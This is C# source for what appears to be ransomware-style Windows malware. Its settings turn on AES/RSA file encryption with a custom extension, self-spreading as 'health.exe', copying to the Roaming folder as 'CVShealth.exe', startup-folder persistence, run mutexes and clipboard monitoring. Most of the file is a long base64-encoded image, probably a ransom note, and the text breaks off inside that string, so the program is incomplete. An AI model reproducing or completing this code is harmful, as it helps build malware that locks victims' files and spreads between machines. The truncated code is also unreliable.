using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "59spkwhx7eyc6p3lmaf472";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "health.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "CVShealth.exe";

	public static string appMutexRun2 = "L1v1y5gq751piPGGHNs";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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